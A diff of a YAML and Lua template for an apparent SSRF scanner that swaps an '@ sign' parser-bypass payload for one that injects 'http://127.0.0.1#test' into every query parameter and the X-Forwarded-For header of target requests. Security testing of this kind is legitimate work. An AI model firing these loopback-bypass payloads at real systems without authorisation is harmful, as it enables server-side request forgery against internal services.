@@ -1,16 +1,16 @@
-# 12. bypass_at_sign.yaml
+# 35_ip_with_fragment.yaml
 meta:
-  id: bypass_at_sign
+  id: ip_with_fragment
   version: 2
-  name: "Bypass with @ Sign (Google.com@IP)"
-  description: "Uses @ sign to confuse parser"
+  name: "IP with Fragment"
+  description: "Uses IP with fragment (#test)"
   author: "SSRFdevil"
   created: "2026-06-19"
   updated: "2026-07-21"
-  rank: 75
-  confidence: 85
-  severity: medium
-  tags: [parser, at_sign, bypass]
+  rank: 92
+  confidence: 80
+  severity: high
+  tags: [ipv4, fragment, bypass]
   references: []
 
 match:
@@ -26,12 +26,14 @@ script:
   source: |
     function run_batch(targets)
         local results = {}
-        local payload_vector = "http://example.com@127.0.0.1/"
-        local host_value = "127.0.0.1"
+        local payload_vector = "http://127.0.0.1#test"
+        
         for _, target in ipairs(targets) do
             local base_url = target.url
+            
             for _, param in ipairs(target.params) do
                 local new_url = base_url
+                
                 if param.location == "Query" then
                     local pattern = param.name .. "=[^&]*"
                     local replacement = param.name .. "=" .. payload_vector
@@ -42,10 +44,13 @@ script:
                         new_url = new_url .. sep .. replacement
                     end
                 end
+
                 table.insert(results, {
                     url = new_url,
                     method = target.method or "GET",
-                    headers = { ["X-Forwarded-For"] = host_value },
+                    headers = {
+                        ["X-Forwarded-For"] = "127.0.0.1#test",
+                    },
                 })
             end
         end
